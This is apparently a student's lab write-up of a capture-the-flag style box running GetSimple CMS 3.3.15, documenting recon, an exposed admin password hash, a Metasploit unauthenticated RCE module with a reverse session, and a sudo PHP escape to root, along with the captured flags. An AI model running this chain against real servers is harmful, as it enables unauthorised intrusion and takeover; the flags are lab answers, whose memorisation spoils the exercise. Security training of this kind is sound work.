# 🏁 Lab: GetSimple CMS (Module 2 Completion)

**Target IP:** `10.129.46.76`

**Date:** 2026-04-05

**User Path:** GetSimple CMS Unauthenticated RCE

**PrivEsc Path:** PHP Sudo Escape (GTFOBins)

**Status:** **Success / Rooted** ✅

---

## 🛠️ Execution Flow

### 1. External Enumeration & Reconnaissance

- **Action:** Fast Port Scanning.
    
    - `nmap -p- --min-rate 5000 10.129.46.76`
        
    - **Result:** Open ports **22 (SSH)** and **80 (HTTP)**.
        
- **Action:** Web Technology Profiling.
    
    - `whatweb 10.129.46.76`
        
    - **Findings:** Running **Apache 2.4.41** on **Ubuntu Linux**. Title: "Welcome to GetSimple!".
        
- **Action:** Directory Brute-forcing.
    
    - `gobuster dir -u http://10.129.46.76 -w /usr/share/seclists/Discovery/Web-Content/common.txt`
        
    - **Interesting Paths:**
        
        - `/admin/` (Login Portal)
            
        - `/data/` (Sensitive Directory)
            
        - `/backups/`
            
        - `/robots.txt` (Confirmed `/admin/` is disallowed).
            

### 2. Information Leakage & Credential Access

- **Action:** Sensitive Data Extraction.
    
    - Navigated to `http://10.129.46.76/data/users/admin.xml`.
        
    - **Discovery:** Found the admin user’s SHA1 password hash: `d033e22ae348aeb5660fc2140aec35850c4da997`.
        
- **Action:** Hash Decryption.
    
    - Type: **SHA1**.
        
    - **Result:** Decrypted to **"admin"**.
        
- **Action:** Authentication.
    
    - Successfully logged into the admin panel at `/admin/` using `admin:admin`.
        
    - **CMS Version:** Identified **GetSimple CMS - Version 3.3.15** in the footer.
        

### 3. Exploitation (Initial Foothold)

- **Action:** Vulnerability Research.
    
    - Identified **Exploit-DB** entry: _GetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit)_.
        
- **Action:** Metasploit Execution.
    
    1. `msfconsole`
        
    2. `use exploit/multi/http/getsimplecms_unauth_code_exec`
        
    3. `set RHOSTS 10.129.46.76`
        
    4. `set LHOST 10.10.14.75`
        
    5. `check` -> **Result:** "The target is vulnerable."
        
    6. `exploit`
        
- **Action:** Post-Exploitation TTY.
    
    - Established **Meterpreter** session.
        
    - Entered `shell` to access the Linux command line.
        
- **Flag 1:** Captured from `/home/mrb3n/user.txt`.
    
- **🚩 Flag:** `7002d65b149b0a4d19132a66feed21d8`
    

### 4. Privilege Escalation (Vertical)

- **Action:** Sudo Permission Check.
    
    - `sudo -l`
        
    - **Result:** `(ALL : ALL) NOPASSWD: /usr/bin/php`.
        
- **Action:** GTFOBins Research.
    
    - Researched PHP Sudo escape sequences at [gtfobins.github.io](https://www.google.com/search?q=https://gtfobins.github.io/gtfobins/php/%23sudo).
        
- **Action:** Root Escape.
    
    - **Command:** `sudo /usr/bin/php -r 'system("/bin/sh -i");'`
        
- **Verification:** `whoami` -> **root**.
    

### 5. Final Root Access

- **Action:** Flag Retrieval.
    
    - `cd /root`
        
    - `cat root.txt`
        
- **Flag 2:** Captured from `/root/root.txt`.
    
- **🚩 Flag:** `f1fba6e9f71efb2630e6e34da6387842`
    

---

## 🧠 Lessons Learned

1. **Directory Listing/Information Leakage:** Even if a login page exists, check directories like `/data/` or `/users/`. XML files often store password hashes that can be easily cracked if using weak algorithms like SHA1.
    
2. **Unauthenticated RCE:** Certain CMS versions allow code execution even before logging in if the exploit leverages specific plugin vulnerabilities.
    
3. **GTFOBins Power:** If `sudo -l` reveals a programming language like **PHP, Python, or Ruby**, you have an almost guaranteed path to root via the `system()` or `exec()` functions.